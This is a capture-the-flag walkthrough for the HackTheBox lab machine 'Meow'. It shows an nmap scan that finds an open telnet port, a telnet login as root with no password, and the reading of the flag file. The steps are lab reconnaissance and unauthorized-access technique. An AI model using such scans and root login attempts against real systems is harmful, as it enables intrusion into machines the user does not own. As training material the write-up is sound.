---
name: Meow
OS: linux
difficulty: very easy
date: May 1st 2023
tags: telnet
---
## Description
Meow is the first box in the starting point tier 0. It covers basic enumaration with Nmap and the use of a telnet client.

## Enumeration
Let's start a simple nmap scan.
```
$ nmap -F -sV --reason $ip

PORT   STATE SERVICE REASON  VERSION
23/tcp open  telnet  syn-ack Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Apparently there is a single port open on the machine and it's telnet.
Let's try connecting using a __telnet client__.
```
$ telnet $ip
Trying 10.129.1.17...
Connected to 10.129.1.17.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login:
```
A simple HackTheBox banner is displayed alongside a login prompt.

## Foothold
Let's try logging in as `root`.
```
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 01 May 2023 05:04:27 PM UTC

  System load:           0.08
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             136
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.17
  IPv6 address for eth0: dead:beef::250:56ff:fe96:63ba

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~#
```
This gives a shell as the root user on the system.
The flag is located in the root user's home directory - `/root`.
```
root@Meow:~# cat flag.txt
[REDACTED]
```

## Summary
This is a simple machine with an insecure remote connection protocol service available (telnet). A simple use of a telnet client and a guess of a username is required to get the flag. 

## Resources
[Telnet wikipedia article](https://en.wikipedia.org/wiki/Telnet)